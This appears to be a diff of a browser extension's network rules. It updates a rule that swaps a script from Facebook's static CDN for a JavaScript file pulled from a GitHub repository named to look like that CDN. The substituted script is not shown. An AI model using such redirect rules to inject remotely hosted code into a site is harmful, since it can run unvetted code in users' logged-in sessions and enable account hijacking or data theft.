@@ -5,11 +5,11 @@
     "action": {
       "type": "redirect",
       "redirect": {
-        "url": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/YOO-Ocd6sOs.js"
+        "url": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/-xtNSS8Cn-Q.js"
       }
     },
     "condition": {
-      "urlFilter": "https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/K4fe5VQ9r65.js*",
+      "urlFilter": "https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/-xtNSS8Cn-Q.js*",
       "resourceTypes": [
         "script"
       ]
@@ -34,7 +34,7 @@
       ]
     },
     "condition": {
-      "urlFilter": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/YOO-Ocd6sOs.js"
+      "urlFilter": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/-xtNSS8Cn-Q.js"
     }
   },
    {
